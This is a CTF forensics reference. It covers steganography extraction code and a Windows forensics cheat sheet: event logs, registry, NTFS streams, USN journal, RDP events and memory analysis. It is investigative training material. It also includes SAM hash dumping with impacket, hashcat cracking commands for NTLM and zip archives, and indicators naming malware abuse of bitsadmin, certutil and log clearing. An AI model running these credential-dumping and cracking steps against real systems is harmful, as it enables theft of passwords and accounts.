**Detection:** Image appears normal but pixel RGB sums show non-random parity distribution.

---

## Pixel Coordinate Chain Steganography (H4ckIT CTF 2016)

Each pixel encodes a data byte in the red channel and the coordinates of the next pixel to read in the green and blue channels, forming a linked-list traversal through the image.

```python
from PIL import Image

def extract_coordinate_chain(image_path, start_x=0, start_y=0):
    """Follow coordinate chain: R=data, G=next_x, B=next_y"""
    img = Image.open(image_path)
    flag = ""
    x, y = start_x, start_y
    visited = set()

    while (x, y) not in visited:
        visited.add((x, y))
        r, g, b = img.getpixel((x, y))[:3]

        if r == 0:  # null terminator
            break

        flag += chr(r)
        x, y = g, b  # next pixel coordinates from green and blue channels

    return flag

# Variants:
# - (R,G) = coordinates, B = data byte
# - Coordinates stored as (G*256+B) for images wider than 256px
# - Starting pixel indicated by metadata or known offset
```

**Key insight:** Linked-list pixel traversal hides both the message and the reading order. Standard LSB analysis misses this because only specific pixels carry data. Look for images where green/blue channels have suspiciously structured values (small numbers that could be coordinates).

---

## AVI Frame Differential Pixel Steganography (H4ckIT CTF 2016)

Compare consecutive video frames pixel-by-pixel. Pixels that increment by exactly 1 encode a "1" bit; unchanged pixels encode "0". Collect bits to form a Brainfuck program or binary message.

```python
from PIL import Image
import subprocess

def extract_frame_differential(frame_dir, num_frames):
    """Compare consecutive frames: incremented pixel = 1, same = 0"""
    bits = ""

    for i in range(num_frames - 1):
        img1 = Image.open(f"{frame_dir}/frame_{i:04d}.png")
        img2 = Image.open(f"{frame_dir}/frame_{i+1:04d}.png")

        pixels1 = list(img1.getdata())
        pixels2 = list(img2.getdata())

        for p1, p2 in zip(pixels1, pixels2):
            if p1 != p2:
                # Pixel changed (incremented by 1) = bit "1"
                bits += "1"
            else:
                bits += "0"

    # Convert bits to ASCII or interpret as Brainfuck
    message = ""
    for i in range(0, len(bits), 8):
        byte = int(bits[i:i+8], 2)
        if 32 <= byte < 127:
            message += chr(byte)

    return message

# Extract frames from AVI first:
# binwalk video.avi  (extracts embedded PNG/BMP frames)
# or: ffmpeg -i video.avi frame_%04d.png
```

**Key insight:** Frame differential steganography hides data in the temporal domain rather than spatial. Standard image stego tools analyze single frames and miss inter-frame changes. Extract all frames, then diff consecutive pairs looking for single-pixel-value increments.


# windows

# CTF Forensics - Windows

## Table of Contents
- [Windows Event Logs (.evtx)](#windows-event-logs-evtx)
- [Registry Analysis](#registry-analysis)
  - [OEMInformation Backdoor Detection](#oeminformation-backdoor-detection)
- [SAM Database Analysis](#sam-database-analysis)
- [Recycle Bin Forensics](#recycle-bin-forensics)
- [Browser History](#browser-history)
- [Windows Telemetry (imprbeacons.dat)](#windows-telemetry-imprbeaconsdat)
- [Hosts File Hidden Data](#hosts-file-hidden-data)
- [Contact Files (.contact)](#contact-files-contact)
- [WinZip AES Encrypted Archives](#winzip-aes-encrypted-archives)
- [NTFS Alternate Data Streams](#ntfs-alternate-data-streams)
- [NTFS MFT Analysis](#ntfs-mft-analysis)
- [USN Journal ($J) Analysis](#usn-journal-j-analysis)
- [SAM Account Creation Timing](#sam-account-creation-timing)
- [Impacket wmiexec.py Artifacts](#impacket-wmiexecpy-artifacts)
- [PowerShell History as Timeline](#powershell-history-as-timeline)
- [User Profile Creation as First Login Indicator](#user-profile-creation-as-first-login-indicator)
- [RDP Session Event IDs](#rdp-session-event-ids)
- [Windows Defender MPLog Analysis](#windows-defender-mplog-analysis)
- [Anti-Forensics Detection Checklist](#anti-forensics-detection-checklist)
- [Windows Memory Forensics: certutil Base64 ZIP Recovery (SEC-T CTF 2017)](#windows-memory-forensics-certutil-base64-zip-recovery-sec-t-ctf-2017)

---

## Windows Event Logs (.evtx)

**Key Event IDs:**

| Event ID | Description |
|----------|-------------|
| 1001 | Bugcheck/reboot |
| 41 | Unclean shutdown |
| 4720 | User account created |
| 4722 | User account enabled |
| 4724 | Password reset attempted |
| 4726 | User account deleted |
| 4738 | User account changed |
| 4781 | Account name changed (renamed) |

**Parse with python-evtx:**
```python
import Evtx.Evtx as evtx
import xml.etree.ElementTree as ET

with evtx.Evtx("Security.evtx") as log:
    for record in log.records():
        xml_str = record.xml()
        root = ET.fromstring(xml_str)
        ns = {'ns': 'http://schemas.microsoft.com/win/2004/08/events/event'}

        event_id = root.find('.//ns:EventID', ns).text
        if event_id == '4720':
            data = {}
            for d in root.findall('.//ns:Data', ns):
                data[d.get('Name')] = d.text
            print(f"User created: {data.get('TargetUserName')}")
```

---

## Registry Analysis

```bash
# RegRipper
rip.pl -r NTUSER.DAT -p all

# Key hives
NTUSER.DAT   # User settings
SAM          # User accounts
SYSTEM       # System config
SOFTWARE     # Installed software
```

### OEMInformation Backdoor Detection

**Location:** `SOFTWARE\Microsoft\Windows\CurrentVersion\OEMInformation`

```python
from Registry import Registry

reg = Registry.Registry("SOFTWARE")
key = reg.open("Microsoft\\Windows\\CurrentVersion\\OEMInformation")
for val in key.values():
    print(f"{val.name()}: {val.value()}")
```

**Malware indicator:** Modified `SupportURL` pointing to C2.

---

## SAM Database Analysis

**Required files:**
- `Windows/System32/config/SAM` - Password hashes
- `Windows/System32/config/SYSTEM` - Boot key

**Extract hashes with impacket:**
```python
from impacket.examples.secretsdump import LocalOperations, SAMHashes

localOps = LocalOperations('SYSTEM')
bootKey = localOps.getBootKey()
sam = SAMHashes('SAM', bootKey)
sam.dump()  # username:RID:LM:NTLM:::
```

**Verify/Crack NTLM:**
```python
from Crypto.Hash import MD4

def ntlm_hash(password):
    h = MD4.new()
    h.update(password.encode('utf-16-le'))
    return h.hexdigest()

# Crack with hashcat
# hashcat -m 1000 hashes.txt wordlist.txt
```

**Common RIDs:**
- 500 = Administrator
- 501 = Guest
- 1000+ = User accounts

---

## Recycle Bin Forensics

**Location:** `$Recycle.Bin\<SID>\`

**File structure:**
- `$R<random>.<ext>` - Actual deleted content
- `$I<random>.<ext>` - Metadata (original path, timestamp)

**Parse $I metadata:**
```python
# strings shows original path
# C.:.\.U.s.e.r.s.\.U.s.e.r.4.\.D.o.c.u.m.e.n.t.s.\.file.docx
```

**Hex-encoded flag fragments:**
```bash
cat '$R_InternSecret.txt'
# Output: 4B4354467B72656330...
echo "4B4354467B72656330..." | xxd -r -p
```

---

## Browser History

**Edge/Chrome (SQLite):**
```python
import sqlite3

history = "Users/<user>/AppData/Local/Microsoft/Edge/User Data/Default/History"
conn = sqlite3.connect(history)
cur = conn.cursor()
cur.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC")
for url, title in cur.fetchall():
    print(f"{title}: {url}")
```

---

## Windows Telemetry (imprbeacons.dat)

**Location:** `Users/<user>/AppData/Local/Packages/Microsoft.Windows.ContentDeliveryManager_*/LocalState/`

```bash
strings imprbeacons.dat | tr '&' '\n' | grep -E "CIP|geo_|COUNTRY"
```

**Key fields:** `CIP` (client IP), `geo_lat/long`, `COUNTRY`, `SMBIOSDM`

---

## Hosts File Hidden Data

**Location:** `Windows/System32/drivers/etc/hosts`

Attackers hide data with excessive whitespace:
```bash
# Detect hidden content
xxd hosts | tail -20
```

---

## Contact Files (.contact)

**Location:** `Users/<user>/Contacts/*.contact`

**Hidden data in Notes:**
```xml
<c:Notes>h1dden_c0ntr4ct5</c:Notes>
```

---

## WinZip AES Encrypted Archives

```bash
# Extract hash
zip2john encrypted.zip > zip_hash.txt

# Crack with hashcat (mode 13600)
hashcat -m 13600 zip_hash.txt wordlist.txt

# Hybrid: word + 4 digits
hashcat -m 13600 zip_hash.txt wordlist.txt -a 6 '?d?d?d?d'
```

---

## NTFS Alternate Data Streams

**Pattern:** NTFS supports multiple data streams per file. The default stream stores normal file content, but additional named streams (Alternate Data Streams / ADS) can hide arbitrary data invisibly. `dir`, Explorer, and most tools only show the default stream.

**Detection and enumeration:**

```bash
# On a mounted NTFS volume (Linux):
getfattr -R -n ntfs.streams.list /mnt/ntfs/     # List all streams on all files

# Using Sleuth Kit on a raw NTFS image (best for forensics):
fls -r ntfs_image.dd                              # Recursive file listing
fls -r ntfs_image.dd | grep -i ":"                # ADS entries contain ":"
# Output: r/r 66-128-4: Documents/credentials.txt:hidden_flag.jpg

# Extract ADS by inode — find inode first:
istat ntfs_image.dd 66                            # Show all attributes for inode 66
# Look for $DATA attributes with names (e.g., $DATA "hidden_flag.jpg")

icat ntfs_image.dd 66-128-4 > hidden_flag.jpg    # Extract ADS by full address

# Using ntfsstreams (part of ntfs-3g):
ntfs_streams_list /dev/sda1
```

**On Windows (live analysis):**

```powershell
# List ADS on a file
Get-Item -Path C:\file.txt -Stream *

# Read ADS content
Get-Content -Path C:\file.txt -Stream hidden_data

# dir /r shows ADS (Windows Vista+)
dir /r C:\Users\suspect\Documents\

# Common ADS names to check:
# Zone.Identifier — marks files downloaded from the internet
# (contains ZoneId, ReferrerUrl, HostUrl)
Get-Content -Path C:\file.exe -Stream Zone.Identifier
```

**Python extraction from raw NTFS image:**

```python
# Using pytsk3 (Python bindings for Sleuth Kit)
import pytsk3

img = pytsk3.Img_Info("ntfs_image.dd")
fs = pytsk3.FS_Info(img)

# Walk all files and check for ADS
for entry in fs.open_dir("/"):
    for attr in entry:
        if attr.info.type == pytsk3.TSK_FS_ATTR_TYPE_NTFS_DATA:
            name = attr.info.name or "(default)"
            if name != "(default)":
                print(f"ADS found: {entry.info.name.name}/{name} "
                      f"(size: {attr.info.size})")
                # Read ADS content
                data = entry.read_random(0, attr.info.size, attr.info.type, attr.info.id)
```

**Key insight:** ADS are invisible to `dir` (without `/r`), Explorer, and most forensic tools that only check default data streams. The Sleuth Kit's `fls` with the colon notation (`inode-type-id`) is the most reliable way to enumerate and extract ADS from images. Malware uses ADS to hide payloads; CTF challenges use them to hide flags. The `Zone.Identifier` stream is the most common ADS — it's automatically added by browsers and email clients to downloaded files.

**When to recognize:** Challenge provides an NTFS image, mentions "hidden data", "hidden in plain sight", or "alternate streams". Credentials files or documents that seem too simple may have ADS attached. Always run `fls -r image.dd | grep ":"` on any NTFS forensics challenge.

**References:** Google CTF 2019 "Home Computer", TCP1P CTF 2023 "hide and split", De1CTF 2019 "DeeplnReal"

---

## NTFS MFT Analysis

**Location:** `C:\$MFT` (Master File Table)

**Key techniques:**
- Filenames are stored in UTF-16LE in the MFT
- Each file has two timestamp sets: `$STANDARD_INFORMATION` (user-modifiable) and `$FILE_NAME` (system-controlled)
- Timestomping detection: Compare SI vs FN timestamps; if SI dates are much older than FN dates, the file was timestomped

```python
# Search MFT for filenames (binary file, use strings)
# ASCII:
# strings $MFT | grep -i "suspicious"
# UTF-16LE:
# strings -el $MFT | grep -i "suspicious"

# MFT record structure (1024 bytes each, starting at offset 0):
# - Offset 0x00: "FILE" signature
# - Attribute 0x30 ($FILE_NAME): Contains FN timestamps (reliable)
# - Attribute 0x10 ($STANDARD_INFORMATION): Contains SI timestamps (modifiable)
```

---

## USN Journal ($J) Analysis

**Location:** `C:\$Extend\$J` (Update Sequence Number Journal)

Tracks all file system changes. Critical when event logs are cleared.

```python
import struct, datetime

def parse_usn_record(data, offset):
    """Parse USN_RECORD_V2 at given offset"""
    rec_len = struct.unpack_from('<I', data, offset)[0]
    major = struct.unpack_from('<H', data, offset + 4)[0]  # Must be 2
    file_ref = struct.unpack_from('<Q', data, offset + 8)[0] & 0xFFFFFFFFFFFF
    parent_ref = struct.unpack_from('<Q', data, offset + 16)[0] & 0xFFFFFFFFFFFF
    timestamp = struct.unpack_from('<Q', data, offset + 32)[0]
    reason = struct.unpack_from('<I', data, offset + 40)[0]
    file_attr = struct.unpack_from('<I', data, offset + 52)[0]
    fn_len = struct.unpack_from('<H', data, offset + 56)[0]
    fn_off = struct.unpack_from('<H', data, offset + 58)[0]  # Usually 60
    filename = data[offset + fn_off:offset + fn_off + fn_len].decode('utf-16-le')
    dt = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=timestamp // 10)
    return dt, filename, reason, file_attr, parent_ref

# USN Reason flags:
# 0x1=DATA_OVERWRITE, 0x2=DATA_EXTEND, 0x4=DATA_TRUNCATION
# 0x100=FILE_CREATE, 0x200=FILE_DELETE, 0x1000=NAMED_DATA_OVERWRITE
# 0x80000000=CLOSE
```

**Key forensic uses:**
- Find file creation/deletion times even when logs are cleared
- Track wmiexec.py output files (`__<timestamp>.<random>`)
- Determine when PowerShell history was written (timeline of commands)
- Detect user profile creation (first interactive login time)

---

## SAM Account Creation Timing

When Security event logs (EventID 4720) are cleared, determine account creation time from the SAM registry:

```python
from regipy.registry import RegistryHive

sam = RegistryHive('SAM')
# Navigate to: SAM\Domains\Account\Users\Names\<username>
# The key's last_modified timestamp = account creation time
names_key = sam.get_key('SAM\\Domains\\Account\\Users\\Names')
for subkey in names_key.iter_subkeys():
    print(f"{subkey.name}: created {subkey.header.last_modified}")
```

---

## Impacket wmiexec.py Artifacts

**wmiexec.py** is a popular remote command execution tool using WMI. Key artifacts:

1. **Output files:** Creates `__<unix_timestamp>.<random>` in `C:\Windows\` (ADMIN$ share)
   - File is created, written with command output, read back, then deleted
   - Each command execution creates a new cycle
   - USN journal preserves create/delete timestamps even after file deletion

2. **WMI Provider Host:** `WMIPRVSE.EXE` prefetch file confirms WMI usage

3. **Timeline reconstruction:** Count USN create-delete cycles for the output file to determine number of commands executed

```python
# Search for wmiexec output files in MFT
# strings -el $MFT | grep -E '^__[0-9]{10}'
# The unix timestamp in the filename = approximate execution start time
```

---

## PowerShell History as Timeline

**Location:** `C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

PSReadLine writes commands incrementally. **USN journal DATA_EXTEND events on this file correspond to individual command executions:**

```text
08:05:19 - FILE_CREATE + DATA_EXTEND → First command entered
08:05:50 - DATA_EXTEND → Second command entered
08:09:57 - DATA_EXTEND → Third command entered
```

This provides exact execution timestamps for each command even when PowerShell logs are cleared.

---

## User Profile Creation as First Login Indicator

When event logs are cleared, the user profile directory creation in USN journal reveals the first interactive login:

```python
# Search USN journal for username directory creation
# Reason flag 0x100 (FILE_CREATE) with parent ref matching C:\Users (MFT ref 512)
# Example: ithelper DIR FILE_CREATE parent=512 at 08:03:51
# → First login (RDP/console) was at approximately 08:03
```

**Key insight:** User profiles are only created on first interactive logon (RDP or console), not via WMI/wmiexec remote execution.

---

## RDP Session Event IDs

**TerminalServices-LocalSessionManager\Operational:**

| Event ID | Description |
|----------|-------------|
| 21 | Session logon succeeded |
| 22 | Shell start notification received |
| 23 | Session logoff succeeded |
| 24 | Session disconnected |
| 25 | Session reconnection succeeded |
| 40 | Session created |
| 41 | Session begin (user notification) |
| 42 | Shell start (user notification) |

**TerminalServices-RemoteConnectionManager\Operational:**

| Event ID | Description |
|----------|-------------|
| 261 | Listener received connection |
| 1149 | RDP user authentication succeeded (contains source IP) |

**RemoteDesktopServices-RdpCoreTS\Operational:**

| Event ID | Description |
|----------|-------------|
| 131 | Connection accepted (TCP, contains ClientIP:port) |
| 102 | Connection from client |
| 103 | Disconnected (check ReasonCode) |

---

## Windows Defender MPLog Analysis

**Location:** `C:\ProgramData\Microsoft\Windows Defender\Support\MPLog-*.log`

Rich source of threat detection timeline, even when other logs are cleared:

```bash
# Find threat detections
grep -i "DETECTION\|THREAT\|QUARANTINE" MPLog*.log

# Find ASR (Attack Surface Reduction) rule activity
grep -i "ASR\|Process.*Block" MPLog*.log

# Key ASR rules (indicators of attack attempts):
# - "Block Process Creations originating from PSExec & WMI commands"
# - "Block credential stealing from lsass.exe"
```

**Detection History files:** `C:\ProgramData\Microsoft\Windows Defender\Scans\History\Service\DetectionHistory\`
- Binary files containing SHA256, file paths, and detection names
- Parse with `strings` to extract IOCs

---

## Anti-Forensics Detection Checklist

When event logs are cleared (attacker used `wevtutil cl` or `Clear-EventLog`):

1. **USN Journal** - Survives log clearing; shows file operations timeline
2. **SAM registry** - Account creation timestamps preserved
3. **PowerShell history** - ConsoleHost_history.txt often survives
4. **Prefetch files** - Shows executed programs (C:\Windows\Prefetch\)
5. **MFT** - File metadata preserved even for deleted files
6. **Defender MPLog** - Separate from Windows event logs, often not cleared
7. **RDP event logs** - TerminalServices logs are separate from Security.evtx
8. **WMI repository** - C:\Windows\System32\wbem\Repository\OBJECTS.DATA
9. **Browser history** - SQLite databases in user AppData
10. **Registry timestamps** - Key last_modified times reveal activity

**Security.evtx EventID 1102** = "The audit log was cleared" (ironically logged even during clearing)

---

## Windows Memory Forensics: certutil Base64 ZIP Recovery (SEC-T CTF 2017)

Volatility memory dump analysis where `psxview` reveals hidden cmd/powershell processes. A malware batch script uses `bitsadmin` to download and `certutil -decode` to base64-decode payloads. Search memory for `UEsD` (the base64 encoding of ZIP magic `PK\x03`) to find in-transit base64 archives, then decode to recover ZIP contents including registry entries.

```bash
# Step 1: Find hidden processes (psxview compares multiple process lists)
vol.py -f dump.raw --profile=Win7SP1x64 psxview

# Step 2: Dump suspicious process memory
vol.py -f dump.raw --profile=Win7SP1x64 procdump -p <PID> -D ./dumps/

# Step 3: Scan raw memory for base64-encoded ZIP archives
# UEsD = base64("PK\x03") — ZIP magic bytes encoded in base64
strings dump.raw | grep -o 'UEsD[A-Za-z0-9+/=]*' > candidates.txt

# Step 4: Decode each candidate
python3 -c "
import base64, sys
with open('candidates.txt') as f:
    for line in f:
        line = line.strip()
        # Pad to valid base64 length
        padded = line + '=' * (-len(line) % 4)
        try:
            data = base64.b64decode(padded)
            if data[:4] == b'PK\x03\x04':
                with open('recovered.zip', 'wb') as out:
                    out.write(data)
                print('ZIP recovered')
                break
        except Exception:
            pass
"

# Step 5: Extract ZIP contents
unzip recovered.zip
```

**Malware indicators to look for:**
- `bitsadmin /transfer` — background download without browser
- `certutil -decode input.b64 output.exe` — base64 decode abuse
- Batch files (`.bat`, `.cmd`) in unusual locations (`%TEMP%`, `%APPDATA%`)
- Registry exports (`.reg` files) inside ZIP payloads

**Key insight:** `certutil` is commonly abused by malware for base64 decoding as a living-off-the-land technique. `UEsD` is the base64 encoding of ZIP magic bytes `PK\x03` — use it as a memory scanning signature to find in-transit ZIP archives before they are written to disk or after they are deleted.

